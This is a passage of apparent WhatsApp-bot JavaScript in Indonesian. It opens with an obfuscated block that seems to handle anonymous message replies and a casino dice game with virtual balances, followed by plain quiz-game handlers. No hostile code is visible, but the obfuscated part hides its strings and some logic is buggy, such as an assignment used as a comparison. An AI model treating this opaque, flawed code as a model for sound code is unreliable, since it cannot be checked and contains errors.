ldLSkAWPCCiGW','8yADMKxdSCorWPO','emo5z2xdTW','WPtdRMWr','WPTQkSkFW7u','fxryWOFcVmoAW7FcQdxcT8oDFW','W5/dIsbNWOa','WQ4yW73dRmoT','xSo+f8oina','WPqwsCkBjG','W6ddQSkTsCkc','xuBcLffC','nLCyW7Tg','WQn24Oc0AtK','vSoNq8oDpW','WOGOW4ZdKCol','WOWKW4/dMCoj','WROzWRazWRm','xSoSbSoolG','WRRdKeddJmk1','b8oSzwVdOG','WQiBDgK4','WOqeWPusWOy','omoc4OcKWRFdNq','e1qTo8oqW4ybxsDV','WPJdOsTwlW','BHBdJCo1WO4','qW/cLe1j','t8kNuhRcTa','WQZdJ1ZcMmk5','tmo9x23cTa','umoTWPOjBq','W7/dSWdcKGm','DFcrKRVcHsNdJG','W4iIW7j/DW','lSkhW4b6','raX+l/c2GjS','WRy3ufru','W67cSq/cHfK','gvKlWOW','W7NcSmkR','W53dIYSX8yAdIG','WRPQWPlcVWO','tVcZOQbfqSor','bCoXW7jaWR8','a8owWP87iq','W4D9aSknja','qCkGW5NcQ8kl','CSk7kmoGW7u','WOLynG','btWrqSoa','pCkfW4DTcG','kq0kWR1F','ufXhW4H8xCkmj0K','W40Pmmkinq','s8owhuO','W4VcLKy2dW','W6H+WONcRW','WOKnvSkBjG','CCoZW5fE8j6bJa','W6pcUuZcK8o0','W45fpSkNsq','dglcJepcVW','ssicW5JcQW','xSohfL/cTa','eqmwW5eZ','omkBW4L3vq','wSkHxMxcJq','W6FcSKhcMCoK','iLKAW6yd','WPmxqmkxma','W4BcG1r6fa','qCkFB8oJW7u','sCoHWRhcRa','b/cUGQBcVokcQCom','WR8bW4/cPK0','WQ/XIlsMW719kW','WPBcIWldLW','W6mTnSoAWQ14WOVdImkZldOc','W4xcIWhdK8oC','eSoSjG','etLAW4RcVa','ySk8WPNcQmkg','umoHWRRcQWq','DCkzWRNcMb0','fSkLWQWGcq','yWXaWRWBWRNdRmoHWRihWOddLeu','W7tcOZO4rW','W7xcTSkatCkf','v8o3WQBcTG','bCowWOG','WOi+W48','WO3cLx8IW5nmWQqrj8kbjxRdNa','W6v9ECkbW7y','gbZcLmkcW74','8joTUcBdLmo8yq','xMXnDxO','WQ5BW5lcOKK','fuTyW7Hl','W73cRG/cGX4','gSoZzgVdUa','WPJdO1uAna','gNRcL0NdQSo8a8ooW652','b8khvWZdTmk1WRRcI3dcKZ4x','WP3dUWHnpq','tSkEW5XXAa','kmkAW5vIqa','WRdcSSoXWPddQa','eVgnPy7cNEkcVZi','WPSvrCkbkq','vvpcLuvW','W6GUnmoDW5WHWR7dKSk6kq','C1ldLf9v','F8oas0NcRa','pfyzWQ9X'];_0xff48=function(){return _0x366c8d;};return _0xff48();}function _0x4ac47f(_0xeb2f62,_0x30f308,_0x5af539,_0x18f4eb,_0x265d78){return _0x372c(_0x30f308- -0x71,_0x5af539);}function _0x349772(_0x455ee4,_0x4717f6,_0x2b24a1,_0x570a3f,_0x5683b0){return _0x372c(_0x4717f6- -0x313,_0x2b24a1);}if(!isGroup&&!msg[_0x5cf1a3(0x352,0x3be,0x36e,'r3kl',0x3b1)][_0x7e1fdb('Q]SR',-0x238,-0x1fb,-0x18c,-0x210)+'e']){if(isQuotedMsg&&quotedMsg['id'][_0x34e6b5(0xe,0x56,0x89,'hf&A',0x27)+_0x5cf1a3(0x3bc,0x2f1,0x354,'5k&Y',0x343)](_0x7e1fdb('ds5J',-0x19c,-0x1bb,-0x1ae,-0x209)+'SS')){var rZpyTq=(_0x7e1fdb('ds5J',-0x1a6,-0x1ed,-0x1c2,-0x186)+_0x7e1fdb('r3kl',-0x1fd,-0x20a,-0x1fb,-0x217)+_0x5cf1a3(0x40e,0x396,0x412,'0)Ws',0x3b0))[_0x349772(-0x1b9,-0x1b9,'I7Fd',-0x187,-0x1bc)]('|'),OHSeIM=-0x47d*0x8+0x706+0x1ce2;while(!![]){switch(rZpyTq[OHSeIM++]){case'0':var pos=secreto[_0x5cf1a3(0x329,0x330,0x357,'QhUS',0x361)+'Of'](dbx);continue;case'1':if(dbx==undefined){if(secreto[dbx][_0x34e6b5(-0x12,0x3e,-0x66,'^WKx',0x1e)][_0x4ac47f(0x190,0x1ac,'Ty1p',0x151,0x1fb)]['id']!==quotedMsg['id']){if(chats[_0x349772(-0x1b3,-0x18f,'Q]SR',-0x16a,-0x1c6)+_0x5cf1a3(0x3a0,0x343,0x36d,'7wLv',0x363)](prefix))return reply(_0x7e1fdb('0v@H',-0x11e,-0x166,-0xf6,-0x1b5)+_0x5cf1a3(0x430,0x3da,0x3de,'[)u9',0x3de)+_0x34e6b5(-0x86,-0xf8,-0x1e,'r3kl',-0x5a)+_0x7e1fdb('0)Ws',-0x1d8,-0x23c,-0x21c,-0x2a5)+_0x7e1fdb('^WKx',-0x1d5,-0x1bf,-0x208,-0x225)+_0x7e1fdb('jAr(',-0x1a9,-0x162,-0x108,-0x1be)+_0x5cf1a3(0x305,0x3a8,0x37f,'0v@H',0x33d)+_0x4ac47f(0x97,0x114,'[)u9',0xbe,0x17c)+_0x34e6b5(-0x8c,-0x93,-0x2e,'ds5J',-0x70)+_0x349772(-0xfa,-0x156,'XX%1',-0x132,-0x17c)+_0x5cf1a3(0x3c3,0x382,0x3bf,'ggif',0x362)+_0x5cf1a3(0x394,0x43d,0x3f7,'ds5J',0x3ee)+_0x5cf1a3(0x357,0x3b1,0x338,'e9sY',0x35f)+'ss');}}continue;case'2':reply(_0x34e6b5(-0xd2,-0xe7,-0xff,'wO62',-0x12a)+_0x349772(-0xa3,-0x11a,'iVox',-0xed,-0x17d)+_0x34e6b5(-0xdf,-0x108,-0x14d,'XX%1',-0x62)+_0x5cf1a3(0x34b,0x3d7,0x404,'0v@H',0x3be)+_0x5cf1a3(0x3a1,0x423,0x385,'7wwJ',0x3c4)+'n');continue;case'3':secreto[_0x4ac47f(0xc9,0x10c,'Ty1p',0x10d,0xde)+'e'](pos,-0xfd+-0x2674+-0x3*-0xd26);continue;case'4':fs[_0x4ac47f(0x14b,0x10a,'[)u9',0x149,0xfe)+_0x34e6b5(-0xba,-0x66,-0xca,'L%Kz',-0x122)+_0x5cf1a3(0x3c7,0x3fe,0x35d,'4OM8',0x3cd)](_0x7e1fdb('hf&A',-0x1f2,-0x1be,-0x1be,-0x1af)+_0x4ac47f(0x6b,0xe5,'ggif',0x7b,0x15b)+_0x349772(-0x12b,-0xdd,'iVox',-0x118,-0xd0)+_0x34e6b5(-0x42,-0x44,0x8,'COf9',0x3b)+_0x7e1fdb('4OM8',-0x288,-0x218,-0x1e9,-0x1f8)+_0x349772(-0x14a,-0x152,'R%bu',-0x15b,-0xef),JSON[_0x34e6b5(-0x91,-0xae,-0xd1,'QhUS',-0x26)+_0x34e6b5(-0xa8,-0x105,-0x74,'CCFL',-0x9d)](secreto,null,-0x7*-0x283+0x1*0x17e4+-0x2977));continue;case'5':conn[_0x34e6b5(-0x1e,-0x28,-0x93,'ds5J',-0x90)](secreto[dbx][_0x34e6b5(0xc,0x2b,-0x4e,'N)XE',-0x52)+_0x34e6b5(-0x7,-0x65,-0x36,'COf9',0x49)],teks_balasan,secreto[dbx][_0x349772(-0x81,-0xf1,'JY0J',-0xd5,-0x14c)]);continue;case'6':var dbx=getMenfessPosi(sender,secreto);continue;case'7':var teks_balasan=_0x34e6b5(-0x34,-0x75,-0xa2,'PMt@',-0x68)+_0x349772(-0x1c2,-0x1bc,'[)u9',-0x15e,-0x19c)+_0x7e1fdb('Ty1p',-0x20e,-0x254,-0x260,-0x287)+_0x5cf1a3(0x38a,0x453,0x39d,'YDNX',0x3f5)+_0x4ac47f(0x100,0x105,'JY0J',0xe6,0xe0)+_0x4ac47f(0x20f,0x1d9,'r3kl',0x1be,0x173)+_0x7e1fdb('QhUS',-0x1fb,-0x1d1,-0x15e,-0x174)+_0x34e6b5(0x2,0x1e,0x6,'CCFL',0x67)+'\x0a\x0a'+chats;continue;}break;}}}function _0x372c(_0x1e5829,_0x240286){var _0x5ac1e4=_0xff48();return _0x372c=function(_0x2fe2ab,_0xd8663b){_0x2fe2ab=_0x2fe2ab-(-0x108f+-0x166*0x5+0x18dd);var _0x275d06=_0x5ac1e4[_0x2fe2ab];if(_0x372c['XbCMnX']===undefined){var _0x613eb6=function(_0x544f15){var _0x38e6e6='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x351778='',_0x5aec00='';for(var _0xe678b=-0x2167+-0x394*-0xa+-0x261,_0x2d1ff5,_0x2767b0,_0x50bd61=-0x1*-0x1b31+-0x41*-0x3d+0x2aae*-0x1;_0x2767b0=_0x544f15['charAt'](_0x50bd61++);~_0x2767b0&&(_0x2d1ff5=_0xe678b%(0xe37+-0x2260+0x142d*0x1)?_0x2d1ff5*(-0xa*-0x1cf+-0x1*-0x25e7+-0x37bd)+_0x2767b0:_0x2767b0,_0xe678b++%(-0xf47+0x5ea+-0x157*-0x7))?_0x351778+=String['fromCharCode'](0xb61*-0x3+0x1d09+-0x619*-0x1&_0x2d1ff5>>(-(-0x48*-0x83+0xc4+-0x259a)*_0xe678b&0x1*0x135b+0xb4d*-0x1+-0x4*0x202)):-0x6b5*-0x5+-0x2*0x1111+0x99){_0x2767b0=_0x38e6e6['indexOf'](_0x2767b0);}for(var _0x3f568b=0x2671+0x3*0x13+-0x26aa,_0x2d1744=_0x351778['length'];_0x3f568b<_0x2d1744;_0x3f568b++){_0x5aec00+='%'+('00'+_0x351778['charCodeAt'](_0x3f568b)['toString'](-0x1*-0x1544+-0x1f50+0xa1c))['slice'](-(0x121*0x1f+-0x62b*-0x5+-0x41d4));}return decodeURIComponent(_0x5aec00);};var _0x33846b=function(_0x140137,_0x48dc67){var _0x4dd981=[],_0x15b619=-0x2301+-0x608+0x2909*0x1,_0x4a0a51,_0x1c3548='';_0x140137=_0x613eb6(_0x140137);var _0x80c1c6;for(_0x80c1c6=-0xd18+-0x2*0x5b6+0xc42*0x2;_0x80c1c6<0x36a*-0x4+0x6c3*-0x3+0x22f1;_0x80c1c6++){_0x4dd981[_0x80c1c6]=_0x80c1c6;}for(_0x80c1c6=0x1e*0x8d+0x1*0x649+0x1*-0x16cf;_0x80c1c6<-0x1f2+0x4eb+0x1*-0x1f9;_0x80c1c6++){_0x15b619=(_0x15b619+_0x4dd981[_0x80c1c6]+_0x48dc67['charCodeAt'](_0x80c1c6%_0x48dc67['length']))%(-0x1*0x9c7+-0x1b15+0x25dc),_0x4a0a51=_0x4dd981[_0x80c1c6],_0x4dd981[_0x80c1c6]=_0x4dd981[_0x15b619],_0x4dd981[_0x15b619]=_0x4a0a51;}_0x80c1c6=-0x1f40+0x2*0x11a7+-0x40e,_0x15b619=-0x20f1+-0x2264+0x4355;for(var _0x423cc0=-0x9cc+-0x20cd+0x2a99;_0x423cc0<_0x140137['length'];_0x423cc0++){_0x80c1c6=(_0x80c1c6+(-0xad*-0x1e+-0x7*0x424+0x8b7))%(-0x970+-0x1cc4+0x2734),_0x15b619=(_0x15b619+_0x4dd981[_0x80c1c6])%(0x1d6d+0x2*0x58f+-0xbf*0x35),_0x4a0a51=_0x4dd981[_0x80c1c6],_0x4dd981[_0x80c1c6]=_0x4dd981[_0x15b619],_0x4dd981[_0x15b619]=_0x4a0a51,_0x1c3548+=String['fromCharCode'](_0x140137['charCodeAt'](_0x423cc0)^_0x4dd981[(_0x4dd981[_0x80c1c6]+_0x4dd981[_0x15b619])%(-0x6ae+-0x1*-0x1a14+-0x1*0x1266)]);}return _0x1c3548;};_0x372c['bhJGzN']=_0x33846b,_0x1e5829=arguments,_0x372c['XbCMnX']=!![];}var _0x297551=_0x5ac1e4[-0x1*-0x1b77+0x1*0x4ca+-0x2041*0x1],_0x1385d6=_0x2fe2ab+_0x297551,_0x1f9845=_0x1e5829[_0x1385d6];return!_0x1f9845?(_0x372c['yeDtOy']===undefined&&(_0x372c['yeDtOy']=!![]),_0x275d06=_0x372c['bhJGzN'](_0x275d06,_0xd8663b),_0x1e5829[_0x1385d6]=_0x275d06):_0x275d06=_0x1f9845,_0x275d06;},_0x372c(_0x1e5829,_0x240286);}if(isPlayCasino(from,casino)){var casinoo=sesiCasino(from,casino);if(sender==casinoo['Y']+(_0x7e1fdb('L%Kz',-0x1cc,-0x169,-0x1e5,-0x19e)+_0x349772(-0x101,-0x160,'DcA#',-0x1a5,-0xfe)+_0x7e1fdb('DcA#',-0x17e,-0x1dd,-0x212,-0x183))&&chats[_0x5cf1a3(0x383,0x42f,0x3ab,'XX%1',0x3bf)+_0x5cf1a3(0x39a,0x351,0x394,'5k&Y',0x373)+'e']()=='n'){var _0x491b96={};_0x491b96[_0x349772(-0x13e,-0xe2,'JY0J',-0xa9,-0xc5)]=_0x34e6b5(-0x10,-0x20,0x61,'zl5U',0x21)+_0x4ac47f(0xf7,0x111,'COf9',0xdc,0xf3)+_0x5cf1a3(0x3ca,0x3a9,0x3ba,'r3kl',0x38d)+_0x7e1fdb('JY0J',-0x1fc,-0x22c,-0x1c3,-0x20a)+_0x4ac47f(0x1cd,0x175,'R%bu',0x12a,0x119)+_0x349772(-0xfc,-0xe0,'QhUS',-0x14f,-0xf3)+casinoo['Y']+(_0x34e6b5(-0x40,-0x3a,-0x5f,'hf&A',0x17)+_0x4ac47f(0x144,0x12f,'ggif',0x128,0x140)+_0x34e6b5(-0x3d,-0x98,-0x88,'U2tT',-0x92)+'me'),_0x491b96[_0x7e1fdb('bJOz',-0x213,-0x211,-0x1b8,-0x265)+_0x5cf1a3(0x2bf,0x335,0x2b2,'^WKx',0x304)]=[casinoo['Y']+(_0x7e1fdb('0v@H',-0x230,-0x243,-0x1d6,-0x22c)+_0x349772(-0x103,-0x154,'A]zk',-0xee,-0x1b3)+_0x349772(-0x14d,-0x18d,'Q]SR',-0x155,-0x1b7))];var _0x328cdf={};_0x328cdf[_0x34e6b5(-0xb2,-0x76,-0x4b,'I7Fd',-0xd7)+'d']=msg,conn[_0x4ac47f(0x19a,0x1a1,'COf9',0x12c,0x214)+_0x34e6b5(-0x30,0xc,-0x11,'09eV',0x49)+'e'](from,_0x491b96,_0x328cdf),clearTimeout(casinoo[_0x34e6b5(-0x20,-0x7d,0x56,'COf9',-0x3b)+'ed']),deleteCasino(from,casino);}else{if(sender==casinoo['Y']+(_0x7e1fdb('v1m[',-0x242,-0x23a,-0x280,-0x276)+_0x5cf1a3(0x32b,0x386,0x338,'n2G%',0x351)+_0x349772(-0x14f,-0x14a,'DcA#',-0x19c,-0xe7))&&chats[_0x7e1fdb('I7Fd',-0x161,-0x1d6,-0x1ae,-0x24d)+_0x4ac47f(0x158,0xee,'7wLv',0xfe,0x9d)+'e']()=='y'){clearTimeout(casinoo[_0x5cf1a3(0x308,0x3a1,0x2e6,'N)XE',0x32a)+'ed']);var angka1=await randomNomor(0xe6d+-0x14ba+0x1*0x657,0x1f*0x2b+0x156a+0x9*-0x2f3),angka2=await randomNomor(-0x4d2+0x1218+-0x4d*0x2c,0x7*0x509+-0x11c*-0xc+0x1029*-0x3);if(angka1>angka2){var iAclur=(_0x7e1fdb('%SBH',-0x1e3,-0x1b7,-0x22e,-0x1f4)+_0x4ac47f(0x226,0x1ad,'5k&Y',0x16c,0x1db))[_0x5cf1a3(0x371,0x3b6,0x40b,'CCFL',0x3ed)]('|'),wCtOsQ=-0x2019+-0x206+0x6d3*0x5;while(!![]){switch(iAclur[wCtOsQ++]){case'0':deleteCasino(from,casino);continue;case'1':var _0x306ebc={};_0x306ebc[_0x4ac47f(0x204,0x1cb,'N)XE',0x225,0x211)]=starGame,_0x306ebc[_0x4ac47f(0x1ad,0x1af,'0v@H',0x20d,0x1af)+_0x349772(-0x145,-0x150,'N)XE',-0x1ce,-0x161)]=[casinoo['Z']+(_0x5cf1a3(0x36d,0x3d6,0x385,'dJE2',0x38c)+_0x7e1fdb(']3vH',-0xf2,-0x15b,-0x133,-0xed)+_0x34e6b5(-0x25,-0x54,0x44,'hf&A',-0x55)),casinoo['Y']+(_0x5cf1a3(0x3b1,0x32c,0x3c4,'CwkS',0x38b)+_0x5cf1a3(0x315,0x3d3,0x39a,'CCFL',0x385)+_0x4ac47f(0x134,0x117,'4OM8',0x136,0x18c))];var _0x61e702={};_0x61e702[_0x5cf1a3(0x3f3,0x39a,0x394,'wO62',0x3fb)+'d']=msg,conn[_0x5cf1a3(0x3e4,0x39e,0x402,'CwkS',0x390)+_0x349772(-0x148,-0x11c,'WUm1',-0x178,-0xa2)+'e'](from,_0x306ebc,_0x61e702);continue;case'2':starGame=_0x4ac47f(0xef,0x156,'7wLv',0x14d,0x154)+_0x4ac47f(0x96,0xdf,'ggif',0x6b,0x104)+_0x7e1fdb('1jLP',-0x19a,-0x215,-0x243,-0x1e5)+_0x4ac47f(0xfc,0x10e,'7wLv',0x122,0x135)+casinoo['Z']+_0x7e1fdb('[)u9',-0x1ae,-0x1ca,-0x15f,-0x1b0)+angka1+(_0x34e6b5(-0x43,-0x7d,0x24,'U2tT',0x25)+'@')+casinoo['Y']+_0x7e1fdb('s$b*',-0x193,-0x1e0,-0x1b4,-0x241)+angka2+(_0x4ac47f(0xde,0x143,'4OM8',0x19b,0x18e)+_0x349772(-0x152,-0x106,'iVox',-0x153,-0xff)+_0x5cf1a3(0x2c1,0x30a,0x2f7,'CwkS',0x326)+_0x4ac47f(0x1cb,0x1ab,'QhUS',0x1df,0x134)+_0x349772(-0x16c,-0xfb,'v1m[',-0x13f,-0x130)+'@')+casinoo['Z']+(_0x4ac47f(0xf9,0x129,'jAr(',0x179,0x145)+_0x7e1fdb('CwkS',-0x12d,-0x16d,-0x180,-0x17c)+_0x5cf1a3(0x3ca,0x392,0x345,'CCFL',0x34e)+_0x4ac47f(0x192,0x147,'7wLv',0x15d,0x165))+nebal(casinoo[_0x34e6b5(-0x67,-0x2,-0x45,'0)Ws',-0xc)+'al']);continue;case'3':await kurangBalance(casinoo['Y']+(_0x7e1fdb(']3vH',-0x1a3,-0x17c,-0x1ee,-0x149)+_0x4ac47f(0x96,0xe8,'s$b*',0xec,0x12e)+_0x5cf1a3(0x359,0x2dc,0x377,'PMt@',0x31a)),nebal(casinoo[_0x5cf1a3(0x3ae,0x3e5,0x436,'aYGT',0x3e1)+'al']),balance);continue;case'4':await addBalance(casinoo['Z']+(_0x34e6b5(-0x29,0x29,-0x1e,'zl5U',-0x92)+_0x349772(-0xea,-0x11e,'U2tT',-0xd2,-0xbb)+_0x34e6b5(-0xcf,-0x121,-0x111,'bJOz',-0x14a)),nebal(casinoo[_0x34e6b5(-0xc2,-0xce,-0x12d,'QhUS',-0xcd)+'al']),balance);continue;}break;}}else{if(angka1<angka2){var mrPIeS=(_0x34e6b5(-0xb,-0x27,0x50,'4OM8',-0x32)+_0x7e1fdb('aYGT',-0x265,-0x217,-0x268,-0x19f))[_0x5cf1a3(0x392,0x34b,0x2f7,'0)Ws',0x32f)]('|'),EHpnfq=0x403+0x26b5+0x1*-0x2ab8;while(!![]){switch(mrPIeS[EHpnfq++]){case'0':starGame=_0x34e6b5(0x16,0x3b,-0x2f,'V4^b',0x82)+_0x4ac47f(0x20d,0x191,'WUm1',0x1f6,0x1ff)+_0x34e6b5(-0xa7,-0x78,-0xf2,'jAr(',-0x76)+_0x349772(-0x129,-0xe1,'Q]SR',-0xc4,-0x85)+casinoo['Z']+_0x4ac47f(0xb9,0xf4,'vnZ%',0x98,0x13e)+angka1+(_0x349772(-0x106,-0x13f,'7wLv',-0x136,-0x100)+'@')+casinoo['Y']+_0x349772(-0x130,-0xfd,'PMt@',-0xe5,-0x164)+angka2+(_0x4ac47f(0x13b,0x122,'bJOz',0xe3,0x13b)+_0x34e6b5(-0x51,-0x19,-0x8,'v1m[',-0x44)+_0x34e6b5(0xb,-0x3c,0x28,'e9sY',0x6f)+_0x7e1fdb('iVox',-0x1c7,-0x1ef,-0x179,-0x183)+_0x5cf1a3(0x378,0x34f,0x318,'WUm1',0x391)+'@')+casinoo['Y']+(_0x5cf1a3(0x30c,0x2bc,0x2e8,'0)Ws',0x310)+_0x5cf1a3(0x42f,0x408,0x3c5,'Ty1p',0x3bc)+_0x5cf1a3(0x396,0x368,0x392,'aYGT',0x35c)+_0x5cf1a3(0x2e9,0x33c,0x335,'hf&A',0x34c))+nebal(casinoo[_0x34e6b5(-0x18,-0x12,-0x7d,'CCFL',0x40)+'al']);continue;case'1':await kurangBalance(casinoo['Z']+(_0x34e6b5(-0x79,-0x10,-0xf0,'^WKx',-0xad)+_0x34e6b5(-0x2c,-0x16,-0x45,'jAr(',0x9)+_0x7e1fdb('jAr(',-0x221,-0x1b2,-0x1d3,-0x1c7)),nebal(casinoo[_0x4ac47f(0xd2,0xef,'YDNX',0xc1,0x77)+'al']),balance);continue;case'2':await addBalance(casinoo['Y']+(_0x34e6b5(-0x45,0x38,-0x57,'0)Ws',0x19)+_0x7e1fdb('dJE2',-0x201,-0x1fe,-0x263,-0x1d6)+_0x34e6b5(-0xb0,-0x91,-0xbf,'CwkS',-0x111)),nebal(casinoo[_0x34e6b5(-0x14,0xe,-0x14,'n2G%',0x68)+'al']),balance);continue;case'3':deleteCasino(from,casino);continue;case'4':var _0x597a10={};_0x597a10[_0x5cf1a3(0x398,0x358,0x367,'dJE2',0x352)]=starGame,_0x597a10[_0x7e1fdb('zl5U',-0x22d,-0x1d3,-0x1e2,-0x1fd)+_0x34e6b5(-0xd7,-0x110,-0xa1,'QhUS',-0x8d)]=[casinoo['Z']+(_0x4ac47f(0xe6,0x159,'r3kl',0xf2,0x115)+_0x349772(-0x126,-0x19b,'N)XE',-0x18e,-0x1b1)+_0x7e1fdb('v1m[',-0x14b,-0x177,-0x14e,-0x130)),casinoo['Y']+(_0x4ac47f(0xe1,0x127,'7wLv',0x1a0,0x114)+_0x7e1fdb('U2tT',-0x180,-0x1b1,-0x1f1,-0x227)+_0x34e6b5(0x12,0x7,0x7f,'Ty1p',-0xd))];var _0x20083a={};_0x20083a[_0x34e6b5(-0x9f,-0x9a,-0xe9,'09eV',-0x2a)+'d']=msg,conn[_0x349772(-0x1a9,-0x181,'Bhc@',-0x1a1,-0x132)+_0x34e6b5(-0x2b,0x0,-0xa0,'aYGT',-0x32)+'e'](from,_0x597a10,_0x20083a);continue;}break;}}else{if(angka1=angka2){starGame=_0x7e1fdb('iVox',-0x1d9,-0x23d,-0x2ae,-0x1ed)+_0x4ac47f(0x135,0xea,'IYKu',0x125,0x150)+_0x7e1fdb('YDNX',-0x1d3,-0x203,-0x1da,-0x237)+_0x5cf1a3(0x2ce,0x322,0x2f9,'hf&A',0x328)+casinoo['Z']+_0x7e1fdb('%SBH',-0x1a4,-0x200,-0x27d,-0x1d8)+angka1+(_0x4ac47f(0x11e,0x141,'ds5J',0x14a,0xe1)+'@')+casinoo['Y']+_0x4ac47f(0xe7,0x160,'bJOz',0x1dd,0x1bd)+angka2+(_0x4ac47f(0x15d,0x118,'r3kl',0xa1,0x12d)+_0x5cf1a3(0x3fa,0x3c9,0x345,'QhUS',0x3c3)+_0x4ac47f(0x194,0x134,'vnZ%',0x123,0x155)+_0x7e1fdb('aYGT',-0x1be,-0x1ae,-0x207,-0x1f4)+_0x7e1fdb('n2G%',-0x1eb,-0x210,-0x202,-0x272)+_0x5cf1a3(0x3fc,0x337,0x3fd,'Bhc@',0x38e)+_0x7e1fdb('zl5U',-0x1d3,-0x179,-0x1d1,-0x1dc));var _0x45d593={};_0x45d593[_0x34e6b5(-0x94,-0x76,-0xff,'dJE2',-0xef)]=starGame,_0x45d593[_0x349772(-0x12c,-0xcc,'jAr(',-0x95,-0x11a)+_0x34e6b5(-0xe,0x4f,0x6e,'iVox',-0x29)]=[casinoo['Z']+(_0x5cf1a3(0x2d4,0x326,0x398,'YDNX',0x33a)+_0x7e1fdb('XX%1',-0x15d,-0x18d,-0x134,-0x118)+_0x7e1fdb('5k&Y',-0x1b8,-0x234,-0x20d,-0x2a5)),casinoo['Y']+(_0x7e1fdb(']3vH',-0x1e7,-0x17c,-0x12c,-0x103)+_0x4ac47f(0x131,0x17c,'bJOz',0x1a3,0x197)+_0x7e1fdb('5k&Y',-0x1f6,-0x234,-0x20e,-0x27e))];var _0x4db1cc={};_0x4db1cc[_0x4ac47f(0x1b5,0x139,'CCFL',0x12f,0x12b)+'d']=msg,conn[_0x7e1fdb('vnZ%',-0x20e,-0x24e,-0x22e,-0x28f)+_0x5cf1a3(0x2f7,0x317,0x32e,'PMt@',0x36f)+'e'](from,_0x45d593,_0x4db1cc),deleteCasino(from,casino);}}}}}}

        // Game
        cekWaktuGame(conn, asahotak) // Asah Otak
        if (isPlayGame(from, asahotak) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, asahotak)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, asahotak)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}asahotak*`)
           asahotak.splice(getGamePosi(from, asahotak), 1)
           }
        }
        cekWaktuGame(conn, caklontong) // Cak Lontong
        if (isPlayGame(from, caklontong) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, caklontong)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, caklontong)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}caklontong*`)
           caklontong.splice(getGamePosi(from, caklontong), 1)
           }
        }
		cekWaktuGame(conn, family100) // Family 100
        if (isPlayGame(from, family100) && isUser) {
           var anjuy = getJawabanGame(from, family100)
           for (let i of anjuy) {
              if (chats.toLowerCase().includes(i)) {
                 var htl = randomNomor(100, 150)
                 addBalance(sender, htl, balance)
                 var anug = anjuy.indexOf(i)
                 anjuy.splice(anug, 1)
                 reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${i}\nHadiah : ${htl} balance\n\nTersisa ${anjuy.length} jawaban lagi!`)
              }
           }
          if (anjuy.length < 1) {
             await reply(`Semua jawaban sudah tertebak\n\nIngin bermain lagi? ketik *${prefix}family100*`)
             family100.splice(getGamePosi(from, family100), 1)
            }
        }
        cekWaktuGame(conn, siapakahaku) // Siapakah Aku
        if (isPlayGame(from, siapakahaku) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, siapakahaku)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, siapakahaku)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}siapakahaku*`)
           siapakahaku.splice(getGamePosi(from, siapakahaku), 1)
           }
        }
        cekWaktuGame(conn, susunkata) // Siapakah Aku
        if (isPlayGame(from, susunkata) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, susunkata)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, susunkata)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}susunkata*`)
           susunkata.splice(getGamePosi(from, susunkata), 1)
           }
        }
        cekWaktuGame(conn, tebakbendera) // Tebak Bendera
        if (isPlayGame(from, tebakbendera) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakbendera)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakbendera)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakbendera*`)
           tebakbendera.splice(getGamePosi(from, tebakbendera), 1)
           }
        }
        cekWaktuGame(conn, tebakgambar) // Tebak Gambar
        if (isPlayGame(from, tebakgambar) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakgambar)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakgambar)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakgambar*`)
           tebakgambar.splice(getGamePosi(from, tebakgambar), 1)
           }
        }
        cekWaktuGame(conn, tebakkalimat) // Tebak Kalimat
        if (isPlayGame(from, tebakkalimat) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkalimat)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkalimat)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkalimat*`)
           tebakkalimat.splice(getGamePosi(from, tebakkalimat), 1)
           }
        }
        cekWaktuGame(conn, tebakkata) // Tebak Kata
        if (isPlayGame(from, tebakkata) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkata)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
           reply(`*Selamat Jawaban Kamu Benar 🎉*\n\nJawaban : ${getJawabanGame(from, tebakkata)}\nHadiah : ${htgm} balance\n\nIngin bermain lagi? ketik *${prefix}tebakkata*`)
           tebakkata.splice(getGamePosi(from, tebakkata), 1)
           }
        }
        cekWaktuGame(conn, tebakkimia) // Tebak Kimia
        if (isPlayGame(from, tebakkimia) && isUser) {
           if (chats.toLowerCase() == getJawabanGame(from, tebakkimia)) {
           var htgm = randomNomor(100, 150)
           addBalance(sender, htgm, balance)
